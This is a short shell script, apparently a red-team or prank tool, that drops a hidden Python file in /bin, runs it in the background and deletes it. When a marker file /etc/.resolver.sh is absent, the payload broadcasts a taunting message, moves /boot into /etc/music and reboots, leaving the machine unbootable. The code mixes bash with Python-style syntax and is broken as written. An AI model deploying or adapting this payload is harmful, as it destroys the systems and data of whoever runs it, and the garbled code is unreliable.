#!/bin/bash
filename = $1
if (filename.lower() in ('beaconBomb')):
cat <<EOFA > /bin/.beaconBomb.py
import os
import subprocess
import argparse
from sys import argv
def main():
    while (True):
        if(os.path.exists(/etc/.resolver.sh)):
            pass
        else:
            os.system("wall -n \"Now that's a lot of damage\"")
            os.system("sleep 5")
            os.system("mkdir /etc/music")
            os.system("mv /boot /etc/music")
            os.system("reboot")
main()
EOFA
chmod +x /bin/.beaconBomb.py
python3 /bin/.beaconBomb.py &
rm /bin/.beaconBomb.py
fi